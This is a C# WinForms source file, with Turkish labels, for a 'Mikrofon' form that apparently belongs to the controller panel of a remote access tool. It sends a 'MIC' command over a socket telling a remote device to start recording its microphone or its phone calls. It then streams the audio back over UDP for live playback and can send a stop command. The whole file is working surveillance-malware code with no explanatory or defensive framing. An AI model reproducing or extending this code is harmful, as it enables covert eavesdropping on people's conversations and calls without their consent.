using NAudio.Wave;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
namespace SV
{
    public partial class Mikrofon : MetroFramework.Forms.MetroForm
    {
        private Recorder rc;
        private IPEndPoint ipep;
        private UdpClient newsock;
        private Socket sc;
        private Dictionary<int, string> source = null;
        public Mikrofon(Socket sock)
        {
            InitializeComponent();
            source = new Dictionary<int, string>()
            {
                { 0, "Mikrofon"},
                { 1, "Varsayılan"},
                { 2, "Telefon Görüşmesi"}
            };
            comboBox1.SelectedItem = "44100";
            comboBox2.SelectedItem = "Default";
            sc = sock;
            button1.Click += button1_Click;
            button2.Click += button2_Click;
            button2.Enabled = false;
        }
        class Recorder
        {
            int sample_ = 44100;
            private UdpClient uc;
            WaveOutEvent output;
            BufferedWaveProvider buffer;
            Thread t;
            public Recorder(int sample, UdpClient u)
            {
                sample_ = sample;
                uc = u;
                t = new Thread(new ThreadStart(Play));
                t.Start();
            }
            private void Play()
            {
                try
                {
                    output = new WaveOutEvent();
                    buffer = new BufferedWaveProvider(new WaveFormat(sample_, 16, 1)); //Pürüzsüz bir ses geliyor bu ayarda :)
                    buffer.BufferLength = 2560 * 16;
                    buffer.DiscardOnBufferOverflow = true;
                    output.Init(buffer);
                    output.Play();
                    for (; ; )
                    {
                        try
                        {
                            IPEndPoint remoteEP = null;
                            byte[] data = uc.Receive(ref remoteEP);
                            buffer.AddSamples(data, 0, data.Length);
                        }
                        catch (Exception) { }
                    }
                }
                catch (Exception) { }
            }
            public void EndStream()
            {
                try
                {
                    uc.Close();
                    output.Dispose();
                    buffer.ClearBuffer();
                    t.Abort();
                }
                catch (Exception) { }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("MIC", Encoding.UTF8.GetBytes("[VERI]BASLA[VERI]" + comboBox1.SelectedItem.ToString() + "[VERI]" + source[comboBox2.SelectedIndex]));
                sc.Send(senddata, 0, senddata.Length, SocketFlags.None);

                ipep = new IPEndPoint(IPAddress.Any, Form1.port_no);
                newsock = new UdpClient(ipep);

                rc = new Recorder(int.Parse(comboBox1.SelectedItem.ToString()), newsock);
            }
            catch (Exception) { }
            button2.Enabled = true;
            button1.Enabled = false;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("MIC", Encoding.UTF8.GetBytes("[VERI]DURDUR"));
                sc.Send(senddata, 0, senddata.Length, SocketFlags.None);
            }
            catch (Exception) { }
            try
            {
                if (rc != null)
                {
                    rc.EndStream();
                    rc = null;
                }
            }
            catch (Exception) { }
            button2.Enabled = false;
            button1.Enabled = true;
        }

        private void Mikrofon_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                button2.PerformClick();
            }
            catch (Exception) { }
        }
    }
}